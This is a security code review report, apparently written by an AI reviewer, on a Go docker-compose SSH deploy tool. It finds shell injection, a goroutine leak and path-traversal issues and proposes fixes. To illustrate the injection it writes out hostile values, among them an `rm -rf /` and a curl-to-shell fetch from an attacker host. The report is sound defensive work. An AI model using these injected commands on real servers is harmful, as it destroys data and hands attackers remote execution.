---
phase: 04-core-deploy-loop
reviewed: 2026-05-15T00:00:00Z
depth: standard
files_reviewed: 5
files_reviewed_list:
  - cmd/docker-deploy/main.go
  - internal/compose/run.go
  - internal/compose/run_test.go
  - internal/config/config.go
  - internal/config/config_test.go
findings:
  critical: 3
  warning: 4
  info: 2
  total: 9
status: fixed
---

# Phase 04: Code Review Report

**Reviewed:** 2026-05-15T00:00:00Z
**Depth:** standard
**Files Reviewed:** 5
**Status:** issues_found

## Summary

Phase 04 implements the core deploy loop: config resolution with compose-file auto-detection, remote compose command construction, TTY/non-TTY output routing, and the non-TTY goroutine drain path. The config logic and shell-quoting approach are broadly sound, but three critical defects were found: a shell-injection bypass via an unquoted `composeFile` in the constructed remote command, a non-TTY goroutine leak when `session.Start` fails after the drain goroutines are already running, and a path-traversal/injection bypass in the `filepath.Base()` validation that can be defeated with a relative path containing no OS path separator on non-POSIX separators. Four warnings cover weaker issues including the context not being checked in `RunCompose`, the `bufio.Scanner` default 64 KB line limit in the stdin confirmation prompt, and the non-standard warning-only validation of `Force` in tests. Two informational findings note dead code and a magic constant.

---

## Critical Issues

### CR-01: Shell injection via unquoted `composeFile` in remote command

**File:** `internal/compose/run.go:45`

**Issue:** The remote command is built by concatenating `composeFile` without any quoting:

```go
cmd := "docker compose -f " + filetransfer.ShellQuote(remotePath) + "/" + composeFile + " up -d --remove-orphans"
```

The code comment says "composeFile is a validated basename and does not need quoting," but this is incorrect. `ShellQuote` on `remotePath` produces a single-quoted token followed by a literal `/` and then `composeFile` unquoted. A composeFile value such as `compose.yaml; rm -rf /` or `compose.yaml' --profile prod '` would break out of the intended command. The `filepath.Base()` validation in `main.go` (line 157) only confirms there is no path separator, but it does NOT strip shell-active characters such as `;`, `&`, `|`, `$`, backticks, spaces, or single-quotes.

Concrete attack path: an attacker who can influence `deploy.yaml` (e.g. the file is checked in, or the user is socially engineered) sets `compose_file: "compose.yaml; curl http://attacker.example/shell.sh | sh"`. The `filepath.Base()` check passes because this string contains no `/` on Linux/macOS. The remote shell then executes the injected command with the credentials of the remote user.

**Fix:** Quote `composeFile` with `ShellQuote` in the command construction:

```go
cmd := "docker compose -f " + filetransfer.ShellQuote(remotePath+"/"+composeFile) + " up -d --remove-orphans"
// OR keep them separate but quote both segments:
cmd := "docker compose -f " + filetransfer.ShellQuote(remotePath) + "/" + filetransfer.ShellQuote(composeFile) + " up -d --remove-orphans"
```

Additionally, tighten the `composeFile` validation in `runDeploy` (main.go:157) to reject any character that is not alphanumeric, `-`, `_`, or `.`:

```go
if !isValidComposeFilename(resolved.ComposeFile) {
    return fmt.Errorf("compose file contains invalid characters: %q", resolved.ComposeFile)
}

func isValidComposeFilename(s string) bool {
    for _, r := range s {
        if !unicode.IsLetter(r) && !unicode.IsDigit(r) && r != '-' && r != '_' && r != '.' {
            return false
        }
    }
    return len(s) > 0
}
```

---

### CR-02: Goroutine leak in non-TTY path when `session.Start` fails

**File:** `internal/compose/run.go:90-107`

**Issue:** In the non-TTY branch, two goroutines are launched (`wg.Add(2)`) before `session.Start` is called:

```go
var wg sync.WaitGroup
wg.Add(2)
go func() {
    defer wg.Done()
    io.Copy(os.Stdout, stdoutPipe) //nolint:errcheck
}()
go func() {
    defer wg.Done()
    io.Copy(os.Stderr, stderrPipe) //nolint:errcheck
}()
// Start the command; drain goroutines; then wait for exit.
if startErr := session.Start(cmd); startErr != nil {
    return fmt.Errorf("starting compose session: %w", startErr)  // goroutines leak here
}
wg.Wait()
```

If `session.Start` returns an error, the function returns immediately. The two `io.Copy` goroutines are blocked on reads from `stdoutPipe` and `stderrPipe` and will never complete. They block until the SSH session is eventually garbage-collected (which is itself blocked by the `defer session.Close()`), but because `defer` has already been registered and `RunCompose` returns, the goroutine may live for an indeterminate duration. In practice, because `session.Close()` runs via defer, this resolves eventually — however, the goroutines are not guaranteed to be done before the caller proceeds, and this is a correctness violation of the "T-04-02-04: WaitGroup prevents goroutine leak" invariant stated in the comments.

**Fix:** Call `session.Start` before launching the drain goroutines, or explicitly close the session before returning on start failure so the pipes close and the goroutines unblock:

```go
// Start first — no goroutines yet.
if startErr := session.Start(cmd); startErr != nil {
    return fmt.Errorf("starting compose session: %w", startErr)
}
// Only now launch goroutines; pipes are live.
var wg sync.WaitGroup
wg.Add(2)
go func() {
    defer wg.Done()
    io.Copy(os.Stdout, stdoutPipe) //nolint:errcheck
}()
go func() {
    defer wg.Done()
    io.Copy(os.Stderr, stderrPipe) //nolint:errcheck
}()
wg.Wait()
return handleWait(session.Wait())
```

---

### CR-03: `filepath.Base()` validation bypass via Windows-style path separator on Linux hosts building deploy.yaml for deployment

**File:** `cmd/docker-deploy/main.go:157`

**Issue:** The injection guard is:

```go
if filepath.Base(resolved.ComposeFile) != resolved.ComposeFile {
    return fmt.Errorf("compose file must be a filename, not a path: %q", resolved.ComposeFile)
}
```

`filepath.Base` on Linux/macOS uses `/` as the only separator. A value like `subdir\compose.yaml` passes the check on Linux because `\` is not a path separator there, but this is a compound concern: the real issue is that `filepath.Base` does **not** strip shell metacharacters. Values like `compose.yaml;id`, `compose.yaml $(id)`, or `compose.yaml'` all pass `filepath.Base` unchanged, so the validation provides a false sense of security while failing to address the actual injection surface (see CR-01). The check stops path-traversal (slashes) but nothing else.

This is classified Critical because the comment and naming of this check (T-04-03-01 in the code, "prevent shell injection") is treated as the security boundary by reviewers and callers; its stated purpose is not achieved. Operators reading the code believe composeFile is safe to embed unquoted — leading directly to CR-01.

**Fix:** Replace the single `filepath.Base` check with an allowlist validation as described in CR-01. The path-separator check (`filepath.Base`) can remain as a secondary defense, but must not be the sole guard.

---

## Warnings

### WR-01: `context.Context` accepted but never consulted in `RunCompose`

**File:** `internal/compose/run.go:42`

**Issue:** `RunCompose` accepts a `ctx context.Context` parameter but never uses it. The SSH session has no cancellation path tied to the context. If the caller cancels the context (e.g. user presses Ctrl-C and the signal handler cancels the root context), `RunCompose` will not notice and will continue blocking in `session.Wait()` indefinitely.

```go
func RunCompose(ctx context.Context, client *gossh.Client, remotePath, composeFile string) error {
    // ctx is never referenced
```

**Fix:** Spawn a goroutine to watch the context and close the session on cancellation:

```go
ctx, cancel := context.WithCancel(ctx)
defer cancel()
go func() {
    <-ctx.Done()
    session.Close()
}()
```

---

### WR-02: `bufio.Scanner` with default token size silently truncates long stdin lines during confirmation prompt

**File:** `cmd/docker-deploy/main.go:199-212`

**Issue:** `bufio.NewScanner(os.Stdin)` uses a default buffer of 64 KB per line. If the user's terminal somehow sends a line longer than 64 KB (edge case, but possible with pasted content), `scanner.Scan()` returns `false` and `scanner.Err()` returns `bufio.ErrTooLong`. The current error handling path:

```go
if !scanner.Scan() {
    if err := scanner.Err(); err != nil {
        return fmt.Errorf("reading confirmation: %w", err)
    }
    fmt.Fprintln(os.Stderr, "No input received — deploy cancelled.")
    return nil
}
```

correctly propagates `scanner.Err()`, so the truncation case returns an error rather than treating 64 KB of garbage as "no input." This is a correctness issue only if the caller of `scanner.Scan()` is expected to handle partial reads — the warning here is that `bufio.NewReader` with `ReadString('\n')` would be more semantically precise for a single-line response prompt and avoids the 64 KB edge case entirely.

**Fix:**
```go
reader := bufio.NewReader(os.Stdin)
answer, err := reader.ReadString('\n')
if err != nil && err != io.EOF {
    return fmt.Errorf("reading confirmation: %w", err)
}
answer = strings.TrimSpace(answer)
if !strings.EqualFold(answer, "y") && !strings.EqualFold(answer, "yes") {
    return nil
}
```

---

### WR-03: `resolved.Path` used unsanitised as remote path with no validation of its content

**File:** `cmd/docker-deploy/main.go:190, 218, 227`

**Issue:** `resolved.Path` comes from `--path` flag or `deploy.yaml` and is used in:
1. The inline `test -d` existence check (line 190) — shell-quoted via `ShellQuote`, safe.
2. `filetransfer.Upload` (line 218) — used in SFTP paths and SSH exec commands; the upload.go code shell-quotes it, safe.
3. `compose.RunCompose` (line 227) — shell-quoted via `ShellQuote`, safe.

However, there is **no validation** that `resolved.Path` is an absolute path. A relative path like `../../../etc` would be shell-quoted and sent to the remote as-is, letting an attacker write files outside the intended deploy root if they control `deploy.yaml`. `ShellQuote` does not prevent this: it merely prevents the shell from interpreting the path as a command; the path traversal still happens at the filesystem level.

**Fix:** Validate in `Resolve()` or `runDeploy()` that `cfg.Path` starts with `/`:

```go
if !strings.HasPrefix(resolved.Path, "/") {
    return fmt.Errorf("remote path must be absolute (start with /), got: %q", resolved.Path)
}
```

---

### WR-04: `session.Close()` return value silently discarded via `defer` in non-TTY path after `session.Wait()` error

**File:** `internal/compose/run.go:52`

**Issue:** `defer session.Close()` is registered at function entry. In the non-TTY path, `handleWait(session.Wait())` may return a non-nil error (compose exited non-zero). When `defer session.Close()` then runs, its error is also discarded. This is mild because `session.Wait()` already closed the remote process, but it means genuine `Close()` errors (connection drops) are silently swallowed rather than wrapped into the returned error. The `//nolint:errcheck` annotation acknowledges this, but there is a subtler issue: when `session.Wait()` returns a *non-ExitError* (e.g. connection reset), `handleWait` wraps it into a `"compose session wait"` error AND `session.Close()` then also runs and discards its own error, potentially hiding a second underlying error. This can make diagnosis harder.

**Fix:** In the error-return path, capture and log the close error:

```go
defer func() {
    if err := session.Close(); err != nil && !errors.Is(err, io.EOF) {
        // session already closed by Wait on non-zero exit; log if unexpected
        fmt.Fprintf(os.Stderr, "warning: session close: %v\n", err)
    }
}()
```

---

## Info

### IN-01: Dead variable `_ = composeFile` in `runDryRun`

**File:** `cmd/docker-deploy/main.go:82`

**Issue:** The function accepts `composeFile string` (line 62) and immediately discards it with `_ = composeFile` (line 82). The parameter exists because the function signature matches `runDeploy` for symmetry, but this pattern is misleading — the blank assignment suggests an intentional discard of a computed value, whereas here the value was never used at all.

**Fix:** Either remove the `composeFile` parameter from `runDryRun` and update the call site (line 39), or add a comment before the parameter that it is intentionally unused:

```go
// composeFile is accepted for API symmetry with runDeploy but is unused in dry-run;
// compose validation is deferred to the actual deploy path.
```

Removing the parameter is cleaner if dry-run never plans to validate it.

---

### IN-02: Magic number `10 * time.Second` SSH dial timeout duplicated in two places

**File:** `cmd/docker-deploy/main.go:98, 170`

**Issue:** The SSH dial timeout of `10 * time.Second` appears in both `runDryRun` (line 98) and `runDeploy` (line 170) with no named constant. If this value needs tuning (or should become configurable via `--timeout` flag), there is no single place to change it.

**Fix:** Extract to a package-level constant:

```go
const sshDialTimeout = 10 * time.Second
```

---

_Reviewed: 2026-05-15T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
